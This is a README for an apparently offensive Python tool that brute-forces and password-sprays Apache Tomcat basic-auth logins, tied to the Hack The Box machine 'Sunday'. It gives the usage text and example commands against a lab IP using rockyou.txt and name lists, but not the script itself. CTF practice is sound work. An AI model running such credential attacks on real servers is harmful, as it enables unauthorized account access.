# TomcatLoginBruteForce
Brute force Tomcat login basic authorization.
Used in the HTB CTF machine 'Sunday'.

## Usage

```
usage: tomcat_login_brute_force.py [-h] [-P PORT] [-t THREADS] [-u USERNAME] [-p PASSWORD] [-s] wordlist url

Apache tomcat login brute force

positional arguments:
  wordlist              wordlist file
  url                   url/ip of the target

options:
  -h, --help            show this help message and exit
  -P PORT, --port PORT  port tomcat is running on. (default: 8080)
  -t THREADS, --threads THREADS
                        number of threads to use. (default: 16)
  -u USERNAME, --username USERNAME
                        username to use for brute forcing. (default: admin)
  -p PASSWORD, --password PASSWORD
                        password used for spray. (default: password123)
  -s, --spray           Use option to password spray against usernames. (default: false)
```

## Examples

### Brute Force

```
python3 tomcat_login_brute_force.py rockyou.txt 10.129.174.191
```

```
python3 tomcat_login_brute_force.py -u tomcat rockyou.txt 10.129.174.191
```

### Password Spray

```
python3 tomcat_login_brute_force.py -s names.txt 10.129.174.191
```

```
python3 tomcat_login_brute_force.py -s -p Summer2024 names.txt 10.129.174.191
```
